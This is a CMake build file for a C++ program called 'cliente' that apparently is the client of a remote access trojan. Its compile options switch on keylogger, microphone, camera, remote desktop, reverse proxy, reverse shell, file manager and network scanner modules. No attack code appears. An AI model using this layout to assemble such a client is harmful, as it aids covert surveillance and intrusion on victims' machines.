cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)

# --- Configuración del estándar C++ ---
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)


set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_reverse_proxy.cpp
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_remote_desktop.cpp
         mod_ventanas.cpp
         mod_info.cpp
         mod_escaner.cpp
         mod_fun.cpp
         mod_dynamic_load.cpp
         ../base64/base64.cpp
         ../sqlite3/sqlite3.c
         ../aes256/aes256.cpp
)

option(USE_CAM "Mod Camara" OFF)
option(USE_SCAN "Mod Escaner Red" OFF)
option(USE_FM "Mod Admin Archivos" OFF)
option(USE_FUN "Mod Bromas" OFF)
option(USE_INFO "Mod Informacion" OFF)
option(USE_KL "Mod Keylogger" OFF)
option(USE_MIC "Mod Microfono" OFF)
option(USE_RD "Mod Escritorio Remoto" OFF)
option(USE_RP "Mod Proxy Inversa" OFF)
option(USE_WM "Mod Admin Ventanas" OFF)
option(USE_SHELL "Mod Shell Inversa" OFF)
option(USE_PM "Mod Admin Procesos" OFF)

add_executable(cliente ${SRCS})

target_link_libraries(cliente PRIVATE mfuuid)

if(USE_CAM)
    target_compile_definitions(cliente PRIVATE __MOD_CAM=1)
endif()

if(USE_SCAN)
    target_compile_definitions(cliente PRIVATE __MOD_SCAN=1)
endif()

if(USE_FM)
    target_compile_definitions(cliente PRIVATE __MOD_FM=1)
endif()

if(USE_FUN)
    target_compile_definitions(cliente PRIVATE __MOD_F=1)
endif()

if(USE_INFO)
    target_compile_definitions(cliente PRIVATE __MOD_INFO=1)
endif()

if(USE_KL)
    target_compile_definitions(cliente PRIVATE __MOD_KEY=1)
endif()

if(USE_MIC)
    target_compile_definitions(cliente PRIVATE __MOD_MIC=1)
endif()

if(USE_RD)
    target_compile_definitions(cliente PRIVATE __MOD_RD=1)
endif()

if(USE_RP)
    target_compile_definitions(cliente PRIVATE __MOD_RP=1)
endif()

if(USE_WM)
    target_compile_definitions(cliente PRIVATE __MOD_WM=1)
endif()

if(USE_SHELL)
    target_compile_definitions(cliente PRIVATE __MOD_SHELL=1)
endif()

if(USE_PM)
    target_compile_definitions(cliente PRIVATE __MOD_PM=1)
endif()